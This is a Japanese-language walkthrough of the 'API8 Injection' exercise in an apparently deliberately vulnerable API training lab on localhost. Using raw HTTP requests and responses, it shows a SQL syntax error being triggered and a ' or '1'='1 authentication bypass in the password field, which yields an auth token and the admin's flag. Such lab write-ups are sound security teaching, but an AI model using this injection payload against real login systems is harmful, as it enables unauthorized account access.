## API8 Injection
資格情報を取得できなくてもログイン試行はできる。

IDもパスワードも分からないので適当にリクエストしてみる。
```http
POST /vapi/api8/user/login HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: b0c69b58-13d6-4863-a6b1-8b0056ac433d
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 51
Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb

{
    "username":"hoge",
    "password":"fuga"
}
```
```http
HTTP/1.1 403 Forbidden
Host: localhost
Date: Sat, 05 Mar 2022 14:26:02 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:26:02 GMT
Content-Type: application/json

{"success":"false","cause":"IncorrectUsernameOrPassword"}
```

当然ながらログインできない。  
Injectionと言っているので、SQLインジェクションを疑い、パスワードに`'`を入れてみると、親切にもSQLの文法エラーが返ってくる。
```http
POST /vapi/api8/user/login HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: b0c69b58-13d6-4863-a6b1-8b0056ac433d
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 52
Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb

{
    "username":"hoge",
    "password":"fuga'"
}
```
```http
HTTP/1.1 500 Internal Server Error
Host: localhost
Date: Sat, 05 Mar 2022 14:27:19 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:27:19 GMT
Content-Type: application/json

{"errorInfo":["42000",1064,"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''fuga'' limit 1' at line 1"]}
```

お約束の`' or '1'='1`を試してみる。
```http
POST /vapi/api8/user/login HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: b0c69b58-13d6-4863-a6b1-8b0056ac433d
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 62
Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb

{
    "username":"hoge",
    "password":"fuga' or '1'='1"
}
```
```http
HTTP/1.1 403 Forbidden
Host: localhost
Date: Sat, 05 Mar 2022 14:29:09 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:29:09 GMT
Content-Type: application/json

{"success":"true","authkey":"oWsZ8vWNuECjCAiZVJHOzsNsNH08zWRZ"}
```
```http
GET /vapi/api8/user/secret HTTP/1.1
Authorization-Token: oWsZ8vWNuECjCAiZVJHOzsNsNH08zWRZ
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 5fac354f-6635-440d-ad60-26a8c4ddb0f2
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=1d146ce6c7cda9305cf082f33a671aeb

```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:30:45 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:30:45 GMT
Content-Type: application/json

{"id":1,"username":"admin","secret":"flag{api8_509f8e201807860d5c91}"}
```
